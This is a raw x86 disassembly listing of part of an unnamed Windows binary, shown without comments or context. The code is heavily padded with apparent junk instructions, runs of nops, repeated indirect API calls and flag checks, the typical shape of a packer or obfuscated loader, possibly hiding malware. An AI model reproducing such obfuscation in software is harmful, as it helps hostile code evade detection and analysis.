  402821:	mov    ecx,DWORD PTR ds:0x407186
  402827:	mov    BYTE PTR ds:0x40702b,0x8f
  40282e:	add    ecx,0xffffff84
  402831:	add    DWORD PTR ds:0x40700b,esi
  402837:	adc    esi,eax
  402839:	sub    esi,esi
  40283b:	mov    ch,BYTE PTR ds:0x407095
  402841:	and    ecx,0xffffff92
  402844:	sub    eax,0xffffffa9
  402847:	add    edi,0x28
  40284a:	add    dl,al
  40284c:	sub    ebx,0x11
  40284f:	cmp    BYTE PTR ds:0x407208,0x1
  402856:	jb     0x401432
  40285c:	nop
  40285d:	nop
  40285e:	nop
  40285f:	nop
  402860:	nop
  402861:	adc    DWORD PTR ds:0x40700e,edi
  402867:	add    edx,0x4b
  40286a:	xor    ebx,0xffffffb8
  40286d:	mov    BYTE PTR ds:0x4071bc,0x2f
  402874:	xor    DWORD PTR ds:0x4070af,edx
  40287a:	xor    DWORD PTR ds:0x407102,edi
  402880:	sub    ebx,eax
  402882:	add    ecx,edi
  402884:	or     DWORD PTR ds:0x407072,esi
  40288a:	mov    cl,BYTE PTR ds:0x407002
  402890:	mov    edx,DWORD PTR ds:0x4070cf
  402896:	add    eax,ecx
  402898:	adc    eax,ecx
  40289a:	add    DWORD PTR ds:0x40701e,ebx
  4028a0:	and    DWORD PTR ds:0x407163,eax
  4028a6:	add    dl,0x3c
  4028a9:	add    al,ah
  4028ab:	push   0x407241
  4028b0:	push   0xf
  4028b2:	push   0x407232
  4028b7:	push   0x407226
  4028bc:	push   0x407226
  4028c1:	call   DWORD PTR ds:0x405038
  4028c7:	cmp    eax,0x0
  4028ca:	jne    0x402861
  4028cc:	xor    eax,edi
  4028ce:	sub    esi,0x1a
  4028d1:	add    dh,bh
  4028d3:	xor    esi,edx
  4028d5:	mov    ebx,DWORD PTR ds:0x4071b0
  4028db:	sub    esi,esi
  4028dd:	add    ch,0x88
  4028e0:	mov    BYTE PTR ds:0x4070c1,0x1e
  4028e7:	mov    esi,DWORD PTR ds:0x4071e1
  4028ed:	xor    DWORD PTR ds:0x4070d3,ebx
  4028f3:	adc    ebx,ecx
  4028f5:	mov    ebx,DWORD PTR ds:0x40705f
  4028fb:	mov    BYTE PTR ds:0x40712f,0xc
  402902:	mov    ah,BYTE PTR ds:0x407005
  402908:	sub    edx,edi
  40290a:	and    esi,0x65
  40290d:	mov    ebx,DWORD PTR ds:0x4070cc
  402913:	mov    BYTE PTR ds:0x407159,0xe7
  40291a:	push   0x407241
  40291f:	push   0xf
  402921:	push   0x407232
  402926:	push   0x407226
  40292b:	push   0x407226
  402930:	call   DWORD PTR ds:0x405038
  402936:	test   eax,eax
  402938:	jne    0x402861
  40293e:	mov    BYTE PTR ds:0x407086,0xbb
  402945:	sbb    DWORD PTR ds:0x407069,esi
  40294b:	mov    BYTE PTR ds:0x4070a6,0xc3
  402952:	sbb    DWORD PTR ds:0x4071a7,edi
  402958:	mov    BYTE PTR ds:0x407128,0xb
  40295f:	add    DWORD PTR ds:0x407173,edi
  402965:	mov    esi,DWORD PTR ds:0x407178
  40296b:	sub    edi,eax
  40296d:	mov    BYTE PTR ds:0x4071d9,0xd7
  402974:	add    edx,esi
  402976:	mov    DWORD PTR ds:0x407103,esi
  40297c:	xor    eax,edx
  40297e:	xor    edx,esi
  402980:	mov    BYTE PTR ds:0x40709a,0xf
  402987:	sub    eax,ebx
  402989:	mov    DWORD PTR ds:0x407188,edi
  40298f:	xor    esi,0x1d
  402992:	add    eax,0x65
  402995:	mov    BYTE PTR ds:0x4071d2,0x51
  40299c:	cmp    BYTE PTR ds:0x407208,0x1
  4029a3:	jb     0x403770
  4029a9:	nop
  4029aa:	nop
  4029ab:	nop
  4029ac:	nop
  4029ad:	nop
  4029ae:	nop
  4029af:	nop
  4029b0:	nop
  4029b1:	nop
  4029b2:	nop
  4029b3:	nop
  4029b4:	nop
  4029b5:	nop
  4029b6:	mov    edi,DWORD PTR ds:0x407076
  4029bc:	sbb    DWORD PTR ds:0x407187,edi
  4029c2:	mov    BYTE PTR ds:0x4070f7,0xaf
  4029c9:	mov    BYTE PTR ds:0x40709e,0x2b
  4029d0:	adc    DWORD PTR ds:0x407165,ebx
  4029d6:	mov    ds:0x407169,eax
  4029db:	or     eax,0xffffffc1
  4029de:	sub    eax,eax
  4029e0:	add    ecx,0xffffffc2
  4029e3:	add    edx,0x7c
  4029e6:	sbb    esi,0x2a
  4029e9:	xor    ecx,eax
  4029eb:	mov    BYTE PTR ds:0x40709a,0x34
  4029f2:	add    ebx,edi
  4029f4:	add    ecx,ebx
  4029f6:	mov    esi,DWORD PTR ds:0x4071ee
  4029fc:	mov    BYTE PTR ds:0x4070c1,0x67
  402a03:	mov    BYTE PTR ds:0x407062,0x70
  402a0a:	mov    DWORD PTR ds:0x40719b,edx
  402a10:	mov    ds:0x407033,al
  402a15:	push   0x407241
  402a1a:	push   0xf
  402a1c:	push   0x407232
  402a21:	push   0x407226
  402a26:	push   0x407226
  402a2b:	call   DWORD PTR ds:0x405038
  402a31:	test   eax,eax
  402a33:	jne    0x402299
  402a39:	mov    ecx,DWORD PTR ds:0x407094
  402a3f:	add    edx,0x35
  402a42:	add    ecx,0x30
  402a45:	mov    DWORD PTR ds:0x407055,ecx
  402a4b:	mov    BYTE PTR ds:0x407100,0x49
  402a52:	or     ch,0xbb
  402a55:	adc    DWORD PTR ds:0x4071d3,eax
  402a5b:	mov    ecx,DWORD PTR ds:0x407121
  402a61:	mov    BYTE PTR ds:0x407132,0x8f
  402a68:	add    eax,0xffffffed
  402a6b:	mov    BYTE PTR ds:0x4071e7,0xf0
  402a72:	mov    BYTE PTR ds:0x407086,0x84
  402a79:	sub    bl,0x2e
  402a7c:	mov    BYTE PTR ds:0x407063,0x27
  402a83:	or     edi,0xffffffd9
  402a86:	mov    BYTE PTR ds:0x407067,0xd4
  402a8d:	or     DWORD PTR ds:0x407114,edi
  402a93:	and    BYTE PTR ds:0x4070f1,al
  402a99:	add    ecx,esi
  402a9b:	push   0x407241
  402aa0:	push   0xf
  402aa2:	push   0x407232
  402aa7:	push   0x407226
  402aac:	push   0x407226
  402ab1:	call   DWORD PTR ds:0x405038
  402ab7:	test   eax,eax
  402ab9:	jne    0x402299
  402abf:	mov    BYTE PTR ds:0x407161,0xa9
  402ac6:	sbb    ebx,ebx
  402ac8:	mov    BYTE PTR ds:0x407115,0x84
  402acf:	mov    al,ds:0x407141
  402ad4:	or     ebx,0xffffffd2
  402ad7:	mov    ebx,DWORD PTR ds:0x4071f7
  402add:	or     DWORD PTR ds:0x407063,ebx
  402ae3:	adc    eax,eax
  402ae5:	sbb    BYTE PTR ds:0x4070da,bh
  402aeb:	adc    ebx,edi
  402aed:	and    DWORD PTR ds:0x4071cc,edi
  402af3:	adc    DWORD PTR ds:0x40710a,ebx
  402af9:	and    DWORD PTR ds:0x407055,eax
  402aff:	sbb    DWORD PTR ds:0x40719a,ebx
  402b05:	add    ecx,0x2e
  402b08:	sub    edi,ecx
  402b0a:	mov    BYTE PTR ds:0x40710f,0xaa
  402b11:	mov    BYTE PTR ds:0x407035,0xed
  402b18:	and    eax,0x32
  402b1b:	cmp    BYTE PTR ds:0x407208,0x1
  402b22:	jb     0x404360
  402b28:	nop
  402b29:	nop
  402b2a:	nop
  402b2b:	mov    BYTE PTR ds:0x4070c3,0xf
  402b32:	mov    BYTE PTR ds:0x40714b,0xdb
  402b39:	mov    BYTE PTR ds:0x4071dc,0x26
  402b40:	sbb    ebx,ecx
  402b42:	and    DWORD PTR ds:0x407011,ebx
  402b48:	xor    edi,0x23
  402b4b:	add    edx,0x13
  402b4e:	sub    eax,0x30
  402b51:	xor    eax,0xffffffb3
  402b54:	mov    edi,DWORD PTR ds:0x407107
  402b5a:	xor    eax,eax
  402b5c:	sbb    esi,eax
  402b5e:	and    eax,0xf
  402b61:	add    eax,edx
  402b63:	adc    edx,esi
  402b65:	push   0x1
  402b67:	add    cl,bl
  402b69:	mov    BYTE PTR ds:0x4071aa,0x56
  402b70:	sbb    DWORD PTR ds:0x4070be,edx
  402b76:	and    DWORD PTR ds:0x407149,ebx
  402b7c:	sbb    DWORD PTR ds:0x4071c8,edi
  402b82:	mov    BYTE PTR ds:0x407193,0x42
  402b89:	mov    DWORD PTR ds:0x40705f,ebx
  402b8f:	adc    edi,esi
  402b91:	mov    BYTE PTR ds:0x4070e8,0x20
  402b98:	mov    BYTE PTR ds:0x4071e7,0xf0
  402b9f:	mov    BYTE PTR ds:0x4071d9,0x52
  402ba6:	adc    ebx,0xffffff84
  402ba9:	mov    eax,ds:0x4070c2
  402bae:	sbb    esi,edx
  402bb0:	or     DWORD PTR ds:0x40716a,eax
  402bb6:	mov    cl,BYTE PTR ds:0x4071e6
  402bbc:	xor    cl,0x59
  402bbf:	mov    esi,DWORD PTR ds:0x4071d5
  402bc5:	mov    ecx,DWORD PTR ds:0x407126
  402bcb:	mov    DWORD PTR ds:0x407131,ecx
  402bd1:	push   0x3e8
  402bd6:	push   0xffffffff
  402bd8:	lea    edi,ds:0x40501c
  402bde:	call   DWORD PTR [edi]
  402be0:	mov    edi,DWORD PTR ds:0x40715b
  402be6:	sbb    DWORD PTR ds:0x407136,edx
  402bec:	sbb    esi,0xffffff9c
  402bef:	mov    eax,ds:0x4071e9
  402bf4:	mov    edi,DWORD PTR ds:0x4071e0
  402bfa:	add    ebx,eax
  402bfc:	adc    DWORD PTR ds:0x407086,ecx
  402c02:	mov    ecx,DWORD PTR ds:0x4070b3
  402c08:	mov    BYTE PTR ds:0x40702a,0x59
  402c0f:	xor    DWORD PTR ds:0x407091,eax
  402c15:	and    edi,0x26
  402c18:	mov    ecx,DWORD PTR ds:0x4071aa
  402c1e:	sub    esi,0xffffffaf
  402c21:	mov    BYTE PTR ds:0x407032,0x4a
  402c28:	add    edi,eax
  402c2a:	mov    DWORD PTR ds:0x40717e,ecx
  402c30:	mov    DWORD PTR ds:0x40701c,edi
  402c36:	dec    DWORD PTR [esp]
  402c39:	jne    0x402bd1
  402c3b:	sbb    edi,eax
  402c3d:	mov    BYTE PTR ds:0x4070ea,0x46
  402c44:	or     ebx,0x47
  402c47:	add    ebx,0xffffffd5
  402c4a:	mov    BYTE PTR ds:0x407088,0x86
  402c51:	add    edi,edi
  402c53:	sbb    DWORD PTR ds:0x4070c0,eax
  402c59:	mov    esi,DWORD PTR ds:0x407013
  402c5f:	or     ecx,0x6d
  402c62:	add    eax,0x53
  402c65:	xor    ebx,edi
  402c67:	sub    BYTE PTR ds:0x4071ab,bl
  402c6d:	mov    eax,ds:0x40712e
  402c72:	adc    DWORD PTR ds:0x40704e,edx
  402c78:	add    ecx,0xffffffb0
  402c7b:	add    edx,esi
  402c7d:	mov    BYTE PTR ds:0x40704b,0xcf
  402c84:	mov    BYTE PTR ds:0x407065,0xa1
  402c8b:	sbb    edi,0xffffffa4
  402c8e:	add    esp,0x4
  402c91:	mov    BYTE PTR ds:0x4071b2,0xe7
  402c98:	mov    BYTE PTR ds:0x40718b,0x7
  402c9f:	mov    DWORD PTR ds:0x40706a,ebx
  402ca5:	mov    BYTE PTR ds:0x407095,0xc
  402cac:	mov    BYTE PTR ds:0x4070f2,0x2c
  402cb3:	mov    bl,BYTE PTR ds:0x40700a
  402cb9:	sbb    eax,edi
  402cbb:	mov    BYTE PTR ds:0x40710b,0x0
  402cc2:	and    DWORD PTR ds:0x4071b9,esi
  402cc8:	mov    BYTE PTR ds:0x40701b,0x42
  402ccf:	and    edi,0x74
  402cd2:	sub    edx,ecx
  402cd4:	add    edx,0x10
  402cd7:	sbb    ebx,ebx
  402cd9:	and    DWORD PTR ds:0x407033,edi
  402cdf:	lea    ecx,ds:0x407210
  402ce5:	add    esi,ebx
  402ce7:	mov    BYTE PTR ds:0x4071f3,0xc0
  402cee:	mov    BYTE PTR ds:0x407184,0xb
  402cf5:	mov    eax,ds:0x407061
  402cfa:	add    edi,0xffffffbf
  402cfd:	mov    DWORD PTR ds:0x407182,edi
  402d03:	add    DWORD PTR ds:0x40713f,ebx
  402d09:	add    al,0x63
  402d0b:	xor    DWORD PTR ds:0x40710f,edx
  402d11:	sub    edi,edx
  402d13:	add    eax,edi
  402d15:	add    DWORD PTR ds:0x40703c,esi
  402d1b:	mov    BYTE PTR ds:0x407072,0xbf
  402d22:	adc    edi,0xffffffaa
  402d25:	or     DWORD PTR ds:0x407036,edi
  402d2b:	add    edi,0x53
  402d2e:	mov    ebx,DWORD PTR ds:0x407154
  402d34:	mov    edx,DWORD PTR ds:0x407103
  402d3a:	mov    BYTE PTR ds:0x407172,0xe8
  402d41:	and    edi,0x19
  402d44:	push   ecx
  402d45:	mov    eax,ds:0x4071c4
  402d4a:	mov    BYTE PTR ds:0x407158,0xc5
  402d51:	sbb    cl,0x8
  402d54:	mov    eax,ds:0x4071af
  402d59:	add    eax,esi
  402d5b:	and    ebx,0x4f
  402d5e:	mov    DWORD PTR ds:0x40700c,ecx
  402d64:	xor    edx,0x3
  402d67:	mov    edx,DWORD PTR ds:0x4071fb
  402d6d:	adc    DWORD PTR ds:0x4070d0,eax
  402d73:	sbb    BYTE PTR ds:0x4070a7,dh
  402d79:	mov    BYTE PTR ds:0x4070d7,0xbd
  402d80:	and    DWORD PTR ds:0x40702e,eax
  402d86:	mov    DWORD PTR ds:0x40719e,esi
  402d8c:	mov    BYTE PTR ds:0x407112,0xa1
  402d93:	or     DWORD PTR ds:0x4070f0,ebx
  402d99:	mov    ah,BYTE PTR ds:0x407171
  402d9f:	mov    esi,DWORD PTR ds:0x405024
  402da5:	call   esi
  402da7:	push   eax
  402da8:	pop    ecx
  402da9:	add    ebx,0x40
  402dac:	add    DWORD PTR ds:0x40715e,edi
  402db2:	mov    BYTE PTR ds:0x40715e,0x3e
  402db9:	mov    BYTE PTR ds:0x40716c,0x44
  402dc0:	or     DWORD PTR ds:0x407017,eax
  402dc6:	xor    DWORD PTR ds:0x407155,ebx
  402dcc:	sub    ah,0x3a
  402dcf:	and    eax,0xffffff9d
  402dd2:	and    bl,0xb0
  402dd5:	mov    eax,ds:0x4070cc
  402dda:	add    DWORD PTR ds:0x407109,edx
  402de0:	mov    edi,DWORD PTR ds:0x4071e6
  402de6:	add    edi,eax
  402de8:	mov    edi,DWORD PTR ds:0x40711b
  402dee:	or     DWORD PTR ds:0x40701f,edx
  402df4:	mov    BYTE PTR ds:0x4071b0,0xd9
  402dfb:	xor    ebx,ebx
  402dfd:	sbb    eax,0xffffff81
  402e00:	mov    DWORD PTR ds:0x407208,ecx
  402e06:	add    edi,edi
  402e08:	mov    esi,DWORD PTR ds:0x4070ae
  402e0e:	sub    esi,edi
  402e10:	mov    edx,DWORD PTR ds:0x4071a9
  402e16:	mov    BYTE PTR ds:0x40716d,0xb7
  402e1d:	or     DWORD PTR ds:0x407010,eax
  402e23:	xor    DWORD PTR ds:0x407107,esi
  402e29:	sub    edi,ebx
  402e2b:	sub    ebx,0xffffff9a
  402e2e:	mov    BYTE PTR ds:0x4070e4,0xff
  402e35:	xor    ebx,ebx
  402e37:	add    eax,esi
  402e39:	sbb    eax,edi
  402e3b:	mov    ebx,DWORD PTR ds:0x40718b
  402e41:	mov    BYTE PTR ds:0x4071bb,0x43
  402e48:	sub    esi,0x44
  402e4b:	and    DWORD PTR ds:0x407128,esi
  402e51:	mov    BYTE PTR ds:0x4071a6,0x60
  402e58:	mov    esi,DWORD PTR ds:0x407068
  402e5e:	sbb    esi,ebx
  402e60:	add    ecx,0x3c
  402e63:	sub    DWORD PTR ds:0x40717b,edi
  402e69:	mov    dh,BYTE PTR ds:0x407111
  402e6f:	mov    dl,BYTE PTR ds:0x407109
  402e75:	add    edi,0xfffffff1
  402e78:	add    ebx,edx
  402e7a:	add    edx,0x6c
  402e7d:	mov    BYTE PTR ds:0x40716b,0x4d
  402e84:	add    BYTE PTR ds:0x4070c0,bl
  402e8a:	add    DWORD PTR ds:0x4071dc,ebx
  402e90:	mov    esi,DWORD PTR ds:0x407011
  402e96:	add    esi,0xffffff93
  402e99:	mov    BYTE PTR ds:0x40715a,0x40
  402ea0:	xor    DWORD PTR ds:0x4070d9,esi
  402ea6:	mov    BYTE PTR ds:0x40702a,0xa3
  402ead:	and    edx,0x68
  402eb0:	add    edx,0xffffffaf
  402eb3:	mov    BYTE PTR ds:0x4070d0,0xbc
  402eba:	mov    ecx,DWORD PTR [ecx]
  402ebc:	mov    BYTE PTR ds:0x4071eb,0xad
  402ec3:	xor    esi,0xffffffb1
  402ec6:	adc    DWORD PTR ds:0x407108,eax
  402ecc:	mov    BYTE PTR ds:0x407179,0x3b
  402ed3:	mov    BYTE PTR ds:0x407126,0xef
  402eda:	mov    BYTE PTR ds:0x407058,0xad
  402ee1:	xor    esi,eax
  402ee3:	mov    ah,BYTE PTR ds:0x4070c0
  402ee9:	mov    DWORD PTR ds:0x407115,esi
  402eef:	mov    BYTE PTR ds:0x4070d0,0xea
  402ef6:	adc    ebx,0x50
  402ef9:	mov    esi,DWORD PTR ds:0x407196
  402eff:	and    edx,0xffffffcc
  402f02:	mov    edi,DWORD PTR ds:0x4071de
  402f08:	mov    esi,DWORD PTR ds:0x407176
  402f0e:	and    DWORD PTR ds:0x407128,esi
  402f14:	adc    esi,edx
  402f16:	sub    BYTE PTR ds:0x40707d,bh
  402f1c:	mov    BYTE PTR ds:0x4071f8,0x7c
  402f23:	xor    edx,0xffffff91
  402f26:	add    ecx,DWORD PTR ds:0x407208
  402f2c:	mov    edx,DWORD PTR ds:0x407026
  402f32:	sub    BYTE PTR ds:0x4071cc,bl
  402f38:	mov    BYTE PTR ds:0x407051,0x6c
  402f3f:	mov    BYTE PTR ds:0x407144,0xe9
  402f46:	or     DWORD PTR ds:0x40703d,ebx
  402f4c:	mov    BYTE PTR ds:0x407152,0xf1
  402f53:	add    eax,0xffffff91
  402f56:	sbb    BYTE PTR ds:0x4070fe,bh
  402f5c:	mov    ebx,DWORD PTR ds:0x4070b4
  402f62:	and    DWORD PTR ds:0x407098,esi
  402f68:	mov    BYTE PTR ds:0x40716d,0x5a
  402f6f:	sub    eax,eax
  402f71:	add    eax,eax
  402f73:	mov    BYTE PTR ds:0x407144,0xf6
  402f7a:	add    edx,ebx
  402f7c:	sub    edx,eax
  402f7e:	mov    BYTE PTR ds:0x4070a0,0x51
  402f85:	add    ecx,0xa4
  402f8b:	mov    edx,DWORD PTR ds:0x4071b4
  402f91:	mov    BYTE PTR ds:0x4071f2,0x81
  402f98:	or     DWORD PTR ds:0x4070a1,edx
  402f9e:	mov    ah,BYTE PTR ds:0x407103
  402fa4:	adc    edx,edx
  402fa6:	adc    esi,eax
  402fa8:	mov    BYTE PTR ds:0x4071f8,0xe8
  402faf:	and    eax,0x4e
  402fb2:	mov    ebx,DWORD PTR ds:0x407175
  402fb8:	mov    esi,DWORD PTR ds:0x407172
  402fbe:	add    esi,ebx
  402fc0:	xor    edi,0xfffffffb
  402fc3:	add    esi,ebx
  402fc5:	and    edi,0x79
  402fc8:	mov    edi,DWORD PTR ds:0x40700f
  402fce:	mov    edx,DWORD PTR ds:0x407175
  402fd4:	or     DWORD PTR ds:0x407151,edi
  402fda:	and    DWORD PTR ds:0x40710e,edx
  402fe0:	cmp    bp,0xfe00
  402fe5:	jb     0x401212
  402feb:	cmp    DWORD PTR [ecx],0x1000
  402ff1:	ja     0x4038b7
  402ff7:	sub    edx,0x11
  402ffa:	mov    edi,DWORD PTR ds:0x40718a
  403000:	add    edx,ecx
  403002:	or     dl,0x49
  403005:	sbb    DWORD PTR ds:0x40718e,edx
  40300b:	mov    BYTE PTR ds:0x407104,0x52
  403012:	sub    DWORD PTR ds:0x40712c,edi
  403018:	sub    esi,ecx
  40301a:	mov    eax,ds:0x40703e
  40301f:	mov    edi,DWORD PTR ds:0x407012
  403025:	sub    edi,0xffffffeb
  403028:	adc    esi,edi
  40302a:	sub    BYTE PTR ds:0x40715e,ah
  403030:	mov    esi,DWORD PTR ds:0x40710c
  403036:	mov    BYTE PTR ds:0x407132,0xfb
  40303d:	mov    BYTE PTR ds:0x407159,0x22
  403044:	sbb    esi,0x44
  403047:	lea    ebx,ds:0x15f92c9a
  40304d:	mov    al,ds:0x40704b
  403052:	and    edi,0x13
  403055:	adc    edi,eax
  403057:	sub    eax,ecx
  403059:	add    edx,esi
  40305b:	sbb    ecx,eax
  40305d:	mov    esi,DWORD PTR ds:0x407001
  403063:	sbb    eax,edx
  403065:	or     ecx,0xffffffe5
  403068:	mov    ecx,DWORD PTR ds:0x4070f3
  40306e:	adc    ecx,edi
  403070:	sub    DWORD PTR ds:0x407024,edi
  403076:	mov    BYTE PTR ds:0x407021,0x64
  40307d:	mov    edi,DWORD PTR ds:0x407122
  403083:	adc    BYTE PTR ds:0x4070af,ch
  403089:	mov    dl,BYTE PTR ds:0x40704b
  40308f:	adc    DWORD PTR ds:0x4070f4,edx
  403095:	mov    BYTE PTR ds:0x407041,0x52
  40309c:	adc    eax,0xffffffd6
  40309f:	mov    edx,DWORD PTR ds:0x40703d
  4030a5:	sub    ebx,0x15b91a88
  4030ab:	add    edi,0xffffffc6
  4030ae:	xor    eax,0x70
  4030b1:	mov    BYTE PTR ds:0x40718b,ch
  4030b7:	mov    edx,DWORD PTR ds:0x40715b
  4030bd:	xor    eax,edi
  4030bf:	add    DWORD PTR ds:0x407029,esi
  4030c5:	add    ecx,esi
  4030c7:	add    DWORD PTR ds:0x407098,eax
  4030cd:	sbb    esi,ecx
  4030cf:	add    BYTE PTR ds:0x40717b,al
  4030d5:	mov    BYTE PTR ds:0x4071b9,0xb9
  4030dc:	add    edx,ecx
  4030de:	mov    esi,DWORD PTR ds:0x40706f
  4030e4:	mov    BYTE PTR ds:0x407101,0xee
  4030eb:	sub    DWORD PTR ds:0x4070ba,ecx
  4030f1:	mov    ecx,DWORD PTR ds:0x40702f
  4030f7:	push   ebx
  4030f8:	mov    BYTE PTR ds:0x407176,0xa4
  4030ff:	mov    BYTE PTR ds:0x407005,0xd0
  403106:	or     esi,0xffffffcc
  403109:	mov    bh,BYTE PTR ds:0x40700e
  40310f:	sbb    edx,esi
  403111:	mov    BYTE PTR ds:0x407166,0x48
  403118:	sbb    ecx,0xfffffff6
  40311b:	mov    esi,DWORD PTR ds:0x4071d2
  403121:	sub    eax,0x64
  403124:	adc    esi,0xffffffbf
  403127:	and    edi,0xffffffb0
  40312a:	mov    eax,ds:0x40703c
  40312f:	mov    BYTE PTR ds:0x40718e,0x87
  403136:	xor    edi,0xffffffe2
  403139:	add    edx,0xffffffbb
  40313c:	ret    
  40313d:	nop
  40313e:	nop
  40313f:	nop
  403140:	nop
  403141:	nop
  403142:	nop
  403143:	nop
  403144:	mov    edi,edi
  403146:	push   ebp
  403147:	mov    ebp,esp
  403149:	lea    esp,[ebp-0x68]
  40314c:	mov    edx,DWORD PTR ds:0x4070d8
  403152:	mov    BYTE PTR ds:0x407017,0x6e
  403159:	mov    BYTE PTR ds:0x4070fc,0x6e
  403160:	mov    BYTE PTR ds:0x407040,0x52
  403167:	mov    ebx,DWORD PTR ds:0x40715f
  40316d:	mov    BYTE PTR ds:0x407006,0xfd
  403174:	add    esi,0x79
  403177:	add    ecx,0xffffff9f
  40317a:	mov    BYTE PTR ds:0x4071df,0x6
  403181:	mov    ebx,DWORD PTR ds:0x407162
  403187:	add    dh,ch
  403189:	xor    edx,0xfffffff2
  40318c:	add    eax,ecx
  40318e:	add    ah,0x33
  403191:	add    BYTE PTR ds:0x407052,ah
  403197:	add    cl,dl
  403199:	mov    BYTE PTR ds:0x40705a,0x9e
  4031a0:	mov    esi,DWORD PTR ds:0x40703a
  4031a6:	add    esi,0x12
  4031a9:	mov    al,ds:0x407061
  4031ae:	sub    DWORD PTR ds:0x407179,esi
  4031b4:	and    BYTE PTR ds:0x407124,al
  4031ba:	add    edi,esi
  4031bc:	mov    ecx,DWORD PTR ds:0x4070cd
  4031c2:	mov    ebx,DWORD PTR ds:0x4070a9
  4031c8:	and    DWORD PTR ds:0x40707e,eax
  4031ce:	mov    BYTE PTR ds:0x4071a5,0xf8
  4031d5:	or     DWORD PTR ds:0x4070d6,edi
  4031db:	sub    esi,eax
  4031dd:	mov    BYTE PTR ds:0x40717a,0x2
  4031e4:	adc    esi,0xffffffd5
  4031e7:	mov    esi,DWORD PTR ds:0x407176
  4031ed:	sbb    DWORD PTR ds:0x4070b8,eax
  4031f3:	mov    BYTE PTR ds:0x407151,0x33
  4031fa:	mov    edx,DWORD PTR ds:0x4070e1
  403200:	push   0x407259
  403205:	call   DWORD PTR ds:0x405000
  40320b:	mov    ecx,DWORD PTR ds:0x407117
  403211:	mov    ds:0x40708d,eax
  403216:	mov    edi,DWORD PTR ds:0x4070eb
  40321c:	mov    edx,DWORD PTR ds:0x407140
  403222:	mov    BYTE PTR ds:0x4070fd,0xed
  403229:	add    ebx,0xffffffd7
  40322c:	and    DWORD PTR ds:0x4070d4,esi
  403232:	mov    bh,BYTE PTR ds:0x40719c
  403238:	xor    DWORD PTR ds:0x40714a,esi
  40323e:	mov    BYTE PTR ds:0x4070b8,0x4c
  403245:	sub    ebx,0xffffffe7
  403248:	sub    ebx,edi
  40324a:	mov    esi,DWORD PTR ds:0x407052
  403250:	mov    ebx,DWORD PTR ds:0x4070cb
  403256:	mov    BYTE PTR ds:0x4070af,0xd1
  40325d:	push   0x407259
  403262:	call   DWORD PTR ds:0x405000
  403268:	sbb    BYTE PTR ds:0x4070bc,bh
  40326e:	mov    edx,DWORD PTR ds:0x4070fb
  403274:	mov    ds:0x40706c,eax
  403279:	mov    edx,DWORD PTR ds:0x4071e4
  40327f:	and    DWORD PTR ds:0x407151,esi
  403285:	or     edi,0x61
  403288:	adc    DWORD PTR ds:0x4070ed,eax
  40328e:	adc    edi,0x15
  403291:	xor    esi,ebx
  403293:	sbb    esi,0xffffffba
  403296:	and    DWORD PTR ds:0x407021,edi
  40329c:	or     esi,0x3a
  40329f:	mov    ebx,DWORD PTR ds:0x4071af
  4032a5:	or     DWORD PTR ds:0x407163,ebx
  4032ab:	sub    esi,edi
  4032ad:	add    cl,0x75
  4032b0:	mov    BYTE PTR ds:0x407061,0xf7
  4032b7:	cmp    BYTE PTR ds:0x407208,0x1
  4032be:	jb     0x4019a4
  4032c4:	nop
  4032c5:	mov    BYTE PTR ds:0x40715c,0x38
  4032cc:	add    DWORD PTR ds:0x40701d,esi
  4032d2:	add    ch,al
  4032d4:	xor    DWORD PTR ds:0x407063,ebx
  4032da:	xor    esi,edi
  4032dc:	mov    ecx,DWORD PTR ds:0x4070a9
  4032e2:	mov    ecx,DWORD PTR ds:0x407162
  4032e8:	xor    ebx,ecx
  4032ea:	mov    BYTE PTR ds:0x40702e,0x3a
  4032f1:	xor    DWORD PTR ds:0x407043,edi
  4032f7:	sub    edi,0x6
  4032fa:	add    edx,0xffffffce
  4032fd:	mov    BYTE PTR ds:0x4070bd,0x6d
  403304:	sub    DWORD PTR ds:0x407176,edx
  40330a:	and    DWORD PTR ds:0x407124,esi
  403310:	xor    DWORD PTR ds:0x4070a5,eax
  403316:	mov    edi,DWORD PTR ds:0x4070b6
  40331c:	xor    edi,edx
  40331e:	or     ecx,0x56
  403321:	push   0x407259
  403326:	call   DWORD PTR ds:0x405000
  40332c:	mov    BYTE PTR ds:0x40703f,0x98
  403333:	sbb    esi,eax
  403335:	add    ebx,eax
  403337:	add    ecx,edi
  403339:	mov    ebx,DWORD PTR ds:0x407121
  40333f:	mov    ecx,DWORD PTR ds:0x407029
  403345:	mov    edx,DWORD PTR ds:0x4070fa
  40334b:	mov    BYTE PTR ds:0x4071c3,0xca
  403352:	xor    esi,0xffffffb8
  403355:	sub    DWORD PTR ds:0x40701d,esi
  40335b:	sub    DWORD PTR ds:0x4071cd,ecx
  403361:	add    ecx,edi
  403363:	mov    BYTE PTR ds:0x4071d8,0x4f
  40336a:	mov    esi,DWORD PTR ds:0x40712f
  403370:	add    cl,0x8e
  403373:	sbb    edi,ebx
  403375:	sub    edi,eax
  403377:	sbb    BYTE PTR ds:0x4070e4,ah
  40337d:	add    edx,esi
  40337f:	mov    BYTE PTR ds:0x407112,0x18
  403386:	push   0x407250
  40338b:	call   DWORD PTR ds:0x405014
  403391:	cmp    eax,0x0
  403394:	jne    0x4032c5
  40339a:	and    bh,0xf
  40339d:	mov    ah,BYTE PTR ds:0x4071f2
  4033a3:	add    dh,bl
  4033a5:	xor    dh,dl
  4033a7:	mov    BYTE PTR ds:0x407182,0x66
  4033ae:	mov    BYTE PTR ds:0x407133,0xa9
  4033b5:	xor    DWORD PTR ds:0x407061,eax
  4033bb:	sub    esi,edi
  4033bd:	add    bl,bl
  4033bf:	xor    DWORD PTR ds:0x4070bb,edx
  4033c5:	mov    BYTE PTR ds:0x407055,0xff
  4033cc:	sub    DWORD PTR ds:0x4071a0,esi
  4033d2:	sub    esi,eax
  4033d4:	xor    edi,esi
  4033d6:	or     DWORD PTR ds:0x407001,eax
  4033dc:	cmp    BYTE PTR ds:0x407208,0x1
  4033e3:	jb     0x401602
  4033e9:	nop
  4033ea:	nop
  4033eb:	nop
  4033ec:	nop
  4033ed:	nop
  4033ee:	or     esi,0xffffff9b
  4033f1:	add    ecx,0xfffffff6
  4033f4:	xor    edi,eax
  4033f6:	sub    DWORD PTR ds:0x407066,eax
  4033fc:	mov    ebx,DWORD PTR ds:0x4071f3
  403402:	add    edx,ebx
  403404:	and    BYTE PTR ds:0x40711d,dh
  40340a:	mov    edi,DWORD PTR ds:0x407019
  403410:	add    DWORD PTR ds:0x4070bf,edx
  403416:	or     DWORD PTR ds:0x407044,esi
  40341c:	mov    BYTE PTR ds:0x407095,0xb0
  403423:	mov    BYTE PTR ds:0x40710a,0x70
  40342a:	mov    BYTE PTR ds:0x40711f,0xf5
